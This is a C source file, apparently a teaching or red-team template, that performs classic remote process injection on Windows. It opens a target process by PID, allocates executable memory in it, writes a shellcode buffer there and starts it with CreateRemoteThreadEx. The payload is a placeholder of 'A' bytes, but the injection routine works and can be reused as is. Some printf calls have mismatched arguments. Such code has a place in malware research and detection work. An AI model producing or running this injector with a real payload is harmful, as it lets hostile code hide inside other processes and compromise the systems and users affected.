#include <windows.h>
#include <stdio.h>
/*#include <stdarg.h>*/
/*MACRO WRITING: #define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)*/
/*MACRO WRITING: #define info(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)*/
/*MACRO WRITING: #define warn(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)*/

const char* OK = "[+]";
const char* INFO = "[!]";
const char* ERR = "[X]";

DWORD PID = NULL;
DWORD TID = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;
UCHAR ShellPay[] = "\x41\x41\x41\x41\x41\x41\x41\x41";
int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("%s Usage: [Program.exe] <PID>\n", ERR);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s Attempting to Open a Handle in Process ID %ld\n", INFO,PID);
    
    /*OPENING PROCESS*/
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );

    if (hProcess == NULL) {
        printf("%s Attempt Failed to Get Handle from the Process ID %ld. Error: %ld \n", ERR, PID, GetLastError());
        if(GetLastError() == 5) {
            printf("%s Error Code: %ld - ACCESS_DENIED (0x5) - Process ID: %ld - Cannot Be Accessed \n", INFO,GetLastError(),PID);
            return EXIT_FAILURE;
        }
        if(GetLastError() == 87) {
            printf("%s Error Code: %ld - ERROR_INVALID_PARAMETER (0x57) - Parameter is Incorrect \n ", INFO, GetLastError(),PID);
            return EXIT_FAILURE;
        }
        /*DEBUG SYSTEM ERROR CODES*/
        return EXIT_FAILURE;
    }
    printf("%s Process ID: %ld Handle Acquired with Value %p \n", OK, PID, hProcess);

    /*ALLOCATING PAYLOAD TO THE PROCESS MEMORY VIA ACQUIRED HANDLE*/
    rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(ShellPay),(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE);
    printf("%s Allocating Memory for Payload: %ld with Payload: %s of size %zu using Handle %p into ProcessID %ld - with PAGE_EXECUTE_READWRITE Permissions \n", INFO, rBuffer, ShellPay, sizeof(ShellPay), hProcess, PID);

    /*WRITING PAYLOAD TO THE ALLOCATED MEMORY*/
    WriteProcessMemory(hProcess, rBuffer, ShellPay, sizeof(ShellPay), NULL);
    printf("%s Memory Successfully Written into ProcessID %ld with Payload %s of Bytes Size %zu \n", OK, PID, ShellPay,sizeof(ShellPay));
    printf("%s SUCCESSFUL SO FAR!\n", OK);

    /*CREATING THREAD TO RUN PAYLOAD*/
    hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);
    if (hThread == NULL){
        printf("%s Failed to Get a Handle to the Thread, Error: %ld", ERR, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s Successfully Acquired Thread Handle %p with Thread ID %ld \n %s - Payload to Process ID %ld - Size %zu - Buffer Value %ld - Process Handle %p\n", OK,hThread, TID, ShellPay, sizeof(ShellPay), rBuffer, PID);
    
    WaitForSingleObject(hThread, INFINITE);
    printf("%s Thread Finished Executing \n", OK);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    printf("%s Injection Successful!", OK);
    return EXIT_SUCCESS;
}